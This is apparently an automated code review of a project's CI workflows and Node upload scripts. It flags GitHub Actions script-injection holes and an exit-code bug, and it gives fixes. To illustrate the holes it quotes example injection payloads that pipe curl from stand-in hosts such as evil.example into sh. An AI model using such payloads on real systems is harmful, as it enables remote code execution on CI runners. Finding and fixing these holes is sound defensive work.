---
phase: 32-human-uat-verification
reviewed: 2026-05-25T18:30:00Z
depth: standard
files_reviewed: 9
files_reviewed_list:
  - scripts/e2e-explore.mjs
  - scripts/e2e-upload-llm-report.mjs
  - tests/e2e/lib/llm-ledger.js
  - .github/workflows/e2e-ingest-llm-report.yml
  - .github/workflows/e2e-nightly.yml
  - tests/e2e/fixtures/uat-phase32-llm-report.schema.test.js
  - tests/e2e/scripts/e2e-explore-phase-flag.test.js
  - tests/e2e/scripts/e2e-upload-llm-report.test.js
  - tests/unit/llm-ledger.test.js
findings:
  critical: 4
  warning: 9
  info: 0
  total: 13
status: issues_found
---

# Phase 32 Code Review

**Reviewed:** 2026-05-25T18:30:00Z
**Depth:** standard
**Files Reviewed:** 9
**Status:** issues_found

## Summary

Phase 32 ships with solid test coverage and well-documented decisions, but contains **four BLOCKER-class defects** centered on GitHub Actions script-injection vectors and one exit-code/documentation contract mismatch. The most serious is classic shell injection in `.github/workflows/e2e-ingest-llm-report.yml` — the `payload_b64` input is interpolated directly into a `run:` step via `${{ }}`, allowing a workflow-dispatch caller to execute arbitrary commands on the runner. The `gh run download ${{ inputs.llm_run_id }}` pattern in `e2e-nightly.yml` has the same vulnerability class. On the client, `scripts/e2e-upload-llm-report.mjs`'s `makeRealGhClient` shells out via `execSync(cmd_string, ...)` with unquoted concatenation of unvalidated inputs.

## Critical / BLOCKER findings

### CR-01: Shell injection — workflow input interpolated into `run:` step (BLOCKER)

**File:** `.github/workflows/e2e-ingest-llm-report.yml:44`

The `payload_b64` workflow_dispatch input is interpolated via `${{ inputs.payload_b64 }}` directly into a `run:` shell command:

```yaml
echo "${{ inputs.payload_b64 }}" | base64 -d > ingest-out/llm-report.json
```

Textbook GitHub Actions script-injection (CWE-94). A caller dispatching with `"; curl evil.example/x | sh #` executes arbitrary commands on the runner under `GITHUB_TOKEN`. Any compromised dev account or shared service account that can `gh workflow run` becomes a runner-exec vector.

**Fix:** Env-var hop so the value never reaches the shell parser:

```yaml
- name: Decode payload
  env:
    PAYLOAD_B64: ${{ inputs.payload_b64 }}
  run: |
    mkdir -p ingest-out
    printf '%s' "$PAYLOAD_B64" | base64 -d > ingest-out/llm-report.json
    jq -e . ingest-out/llm-report.json > /dev/null
```

### CR-02: Shell injection — `gh run download ${{ inputs.llm_run_id }}` (BLOCKER)

**File:** `.github/workflows/e2e-nightly.yml:111` (also line 156 for `force_full_suite`)

Same class as CR-01. A caller can dispatch nightly with `llm_run_id: "$(curl evil|sh)"`. Nightly has elevated `issues: write`.

**Fix:** Env-var hop + numeric guard:

```yaml
- name: Download and validate LLM report (if llm_run_id provided)
  if: inputs.llm_run_id != ''
  env:
    LLM_RUN_ID: ${{ inputs.llm_run_id }}
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    case "$LLM_RUN_ID" in ''|*[!0-9]*) echo "invalid llm_run_id: $LLM_RUN_ID" >&2; exit 1 ;; esac
    mkdir -p downloaded-llm-report
    gh run download "$LLM_RUN_ID" -n llm-report -D downloaded-llm-report
    ...
```

### CR-03: Command injection in `makeRealGhClient.workflowRun` (BLOCKER)

**File:** `scripts/e2e-upload-llm-report.mjs:307-328` (also `runList:330-337`, `runView:339-342`)

`workflowRun` builds a shell command by concatenating user-supplied `inputs[k]=v` pairs and passing to `execSync(cmd_string, ...)`. `execSync(string)` invokes `/bin/sh -c <string>`. Any future caller passing `inputs.llm_run_id = "1234; curl evil|sh"` executes it. Today's caller passes `String(filtered[0].databaseId)` — a value parsed from `gh run list --json` — so a compromised gh binary or MitM on its API call could inject.

**Fix:** Use `execFileSync` (no shell):

```js
import { execFileSync } from 'node:child_process';
workflowRun(file, inputs, opts) {
  const args = ['workflow', 'run', file];
  for (const [k, v] of Object.entries(inputs || {})) args.push('-f', `${k}=${v}`);
  if (opts?.stdinPayload !== undefined) args.push('-F', 'payload_b64=@-');
  execFileSync('gh', args, { encoding: 'utf8', input: opts?.stdinPayload, stdio: ['pipe', 'pipe', 'pipe'] });
}
```

Apply same pattern to `runList`, `runView`, `repoView`, `authStatus`. Add numeric validator at the boundary: `if (!/^\d+$/.test(String(ingestRunId))) throw ...` before Stage 2.

### CR-04: Documented exit code 6 mid-run never fires (BLOCKER)

**File:** `scripts/e2e-explore.mjs:36`, `:233-238`, `:505-517`

Header documents `6 — phase spend cap reached at STARTUP or mid-run`. Startup case (line 480: `process.exit(6)`) correct. Mid-run case broken: `runOneIteration` returns `{stopAll: true}`, main loop breaks, then unconditionally runs `finalizeLlmReport` and `process.exit(0)`. CI tooling grepping exit codes will mis-classify a mid-run cap-trip as normal completion. Same bug for monthly cap (LLM-06, line 165-168) — documented exit 4 silently becomes exit 0.

**Fix:** Distinguish cap-trip path from natural completion:

```js
let stopReason = null;
for (let n = 1; n <= iterations; n++) {
  const result = await runOneIteration({ ... });
  if (result.stopAll) { stopReason = result.reason; break; }
}
finalizeLlmReport(reportPath);
if (stopReason === 'phase_cap') process.exit(6);
if (stopReason === 'monthly_cap') process.exit(4);
process.exit(0);
```

Have `runOneIteration` return `{ stopAll: true, reason: 'phase_cap' | 'monthly_cap' }`.

## Warnings

### WR-01: `parseInt` silently truncates `--iterations` value
**File:** `scripts/e2e-explore.mjs:88-92` — `parseInt('5abc', 10)` returns `5`. Use the strict regex pattern that `--phase` uses.

### WR-02: `isMain` check broken on Windows / paths with spaces
**File:** `scripts/e2e-upload-llm-report.mjs:358` — `import.meta.url === \`file://${process.argv[1]}\`` never matches on Windows (`file:///C:/...` vs `C:\...`). Use `fileURLToPath(import.meta.url) === path.resolve(process.argv[1])`.

### WR-03: `runList --limit 5` can miss the dispatched run under concurrent operators
**File:** `scripts/e2e-upload-llm-report.mjs:208`, `:218-232` — If five operators dispatch within the 3-second settle window, helper's own run is no longer in the top 5; `filtered[0]` becomes someone else's. Use `gh run list --user @me --limit 20`.

### WR-04: `MAX_BASE64_BYTES` ceiling math is off
**File:** `scripts/e2e-upload-llm-report.mjs:96` — 60KB ceiling artificially rejects ~4KB of legitimately-uploadable reports vs GH's 65535-char cap. Raise to ~65000 or document derivation.

### WR-05: `E2E_LEDGER_PATH_OVERRIDE` has no runtime CI guard
**File:** `tests/e2e/lib/llm-ledger.js:57-79` — Defense-in-depth missing. Misconfigured CI step setting the override silently bypasses spend caps. Add `if (process.env.CI || process.env.GITHUB_ACTIONS) throw ...` inside the LEDGER_PATH resolver.

### WR-06: Ledger temp-file rename races on EXDEV cross-filesystem
**File:** `tests/e2e/lib/llm-ledger.js:315-317` — `fs.renameSync(tmp, ledgerPath)` atomic only within same FS. Catch `EXDEV` and fall back to direct write. Same code duplicated in `tests/e2e/lib/llm-report.js:69-73`.

### WR-07: Test 4 in `e2e-explore-phase-flag.test.js` is too lenient
**File:** `tests/e2e/scripts/e2e-explore-phase-flag.test.js:94-105` — Test asserts `r.status !== 2 OR r.status === null` (timeout-as-PASS). A future regression where parseArgs incorrectly rejects with exit 5 would also pass. Strengthen: assert stderr lacks rejection messages.

### WR-08: Mid-run phase-cap check duplicates code
**File:** `scripts/e2e-explore.mjs:232-242`, `:283-293` — Two identical 11-line blocks. Extract `checkMidRunPhaseCap(phase, stderr)` helper. Makes CR-04 fix cleaner too.

### WR-09: `jq -e .` rejects valid-but-empty payload silently in workflow
**File:** `.github/workflows/e2e-ingest-llm-report.yml:49` — `jq -e .` exits non-zero on `null`/`false`, producing confusing failure mode. Use `jq -e 'type == "object" and has("iterations")'` for explicit structural validation.

## Out-of-scope but noted

Already documented in `32-UAT-EVIDENCE.md` Anomalies — NOT re-reported:
- `resolveRunId()` semantic mismatch (helper line 359)
- xdg-open exit-3 on WSL2 (helper line 339-ish)
- Phase 31 `LLM_API_ERROR` classification scope
- Plan 32-04 worktree-merge harness bug (recovered as `a3da175`)
